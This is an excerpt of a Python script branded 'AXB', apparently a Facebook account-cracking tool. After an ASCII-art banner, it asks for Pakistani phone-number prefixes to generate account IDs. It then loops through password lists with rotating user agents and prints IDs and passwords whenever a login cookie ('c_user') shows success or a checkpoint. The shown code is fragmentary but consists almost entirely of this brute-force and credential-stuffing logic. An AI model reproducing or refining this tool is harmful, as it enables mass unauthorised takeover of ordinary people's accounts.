...
logo = """
\033[1;37;1m   .o.       ooooooo  ooooo oooooooooo.  
\033[1;37;1m  .888.       `8888    d8'  `888'   `Y8b 
\033[1;37;1m   .8"888.        Y888..8P     888     888 
\033[1;37;1m   .8' `888.        `8888'      888oooo888' 
\033[1;37;1m  .88ooo8888.      .8PY888.     888    `88b 
\033[1;37;1m   8' `888.        `8888'      888oooo888' 
\033[1;37;1mo88o     o8888o o888o  o88888o o888bood8P
\033[1;37;1m-----------------------------------------------
...
def method1():
	...
	print('[+] For Pak Enter Three Digit Code (92301)')
	print(47*'-')
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[7:22]
				print('\033[1;92m[AXB-OK] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\033[1;91m[AXB-CP] '+cid+' | '+ps+'\033[0;97m')
...
def mbcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;92mIAXB\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
			sys.stdout.flush()
			ua = random.choice(syed)
